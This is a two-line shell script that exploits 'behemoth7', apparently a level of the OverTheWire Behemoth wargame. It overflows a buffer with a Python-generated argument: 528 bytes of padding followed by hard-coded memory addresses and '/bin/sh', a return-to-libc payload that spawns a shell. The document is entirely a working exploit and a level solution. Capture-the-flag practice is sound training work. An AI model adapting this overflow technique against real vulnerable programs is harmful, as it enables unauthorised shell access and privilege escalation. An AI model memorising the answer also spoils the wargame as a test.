#!/bin/sh
./behemoth7 `python -c "print 'a' * 512 + 'a' * 16 + '\x50\xc8\xe4\xf7' + '\xff' * 4 + '\xb0\xd8\xff\xff' + '/bin/sh'"`
